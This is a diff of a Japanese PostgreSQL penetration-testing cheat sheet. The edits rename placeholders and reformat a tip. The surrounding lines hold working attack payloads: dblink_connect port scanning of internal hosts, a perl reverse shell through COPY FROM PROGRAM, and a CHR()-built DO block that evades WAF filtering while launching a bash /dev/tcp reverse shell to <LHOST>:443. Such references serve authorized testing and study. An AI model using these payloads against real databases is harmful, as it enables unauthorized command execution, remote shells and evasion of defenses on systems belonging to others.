@@ -72,8 +72,8 @@ SELECT * FROM pg_extension;
 
 同一NWの他ホストをスキャンし、dblink接続失敗時のエラーメッセージからポートの状態を判別できる
 ```sql
-SELECT * FROM dblink_connect('host=<TargetIP>
-                              port=<TargetPort>
+SELECT * FROM dblink_connect('host=<target_IP>
+                              port=<target_port>
                               user=<username>
                               password=<password>
                               dbname=<database>
@@ -231,7 +231,8 @@ CREATE TABLE cmd_exec(cmd_output text);
 COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<Port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
 ```
 
-💡 WAF/フィルタリング回避（CHR関数を利用した動的構築）
+>[!TIP]
+>WAF/フィルタリング回避：CHR関数を利用してSQL文字列を動的構築することで、フィルタリングを回避できる。
 ```sql
 DO $$DECLARE cmd text;BEGIN
   cmd := CHR(67) || 'OPY (SELECT '''') TO PROGRAM ''bash -c "bash -i >& /dev/tcp/<LHOST>/443 0>&1"''';
